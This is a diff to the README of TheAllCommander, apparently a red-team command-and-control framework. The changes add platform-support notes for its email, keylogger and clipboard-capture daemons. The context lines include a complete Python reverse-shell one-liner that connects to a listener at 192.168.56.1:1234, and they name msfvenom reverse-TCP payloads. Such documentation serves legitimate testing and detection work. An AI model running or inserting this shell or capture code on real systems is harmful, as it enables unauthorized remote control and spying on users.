@@ -26,6 +26,7 @@ There is also an AbstractCommandMacro class which can accept commands and transl
 # Daemons
 Currently, TheAllCommander has been tested with the following payloads:
 1) Python. Currently TheAllCommander includes a HTTPS, UDP/DNS, and EMail emulation daemon. These daemons are in no way produced for operations in a real Red Team engagement, and are developed to serve as a template for further comm development. Both demonstrate use of these communication protocols in a comparable way.
+		Note: The email daemon is Windows specific and has not yet been ported to Linux. 
 2) Msfvenom unstaged tcp payloads (windows/x64/shell_reverse_tcp and linux/x86/shell_reverse_tcp)
 3) "Python oneliner" ->  TheAllCommander can receive connections from python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.56.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\"/bin/sh\",\"-i\"]);'
 		Note: This has been tested with /bin/sh and the $ will be removed to normalize IO with a Linux ncat shell
@@ -219,7 +220,7 @@ pip install pycryptodome
 
 
 # Building & Running
-TheAllCommander server is currently set up to run and test on Windows. Cross-platform support is a future goal. 
+TheAllCommander server is tested to build and work on both Windows and Linux. The python daemons are developed primarily to demonstrate indicators of compromise on Windows hosts, and as such the keylogger and clipboard capture functionality does not work on Linux. However, the daemon will load and run, managing imports on an operating system dependent basis. 
 
 1) There should be a keystore.jks file (by default nomenclature, changeable in test.properties) in the config directory. To generate one, use the following command to leverage the Java keytool program: keytool -genkey -alias server-alias -keyalg RSA -keypass password -storepass password -keystore keystore.jks
 
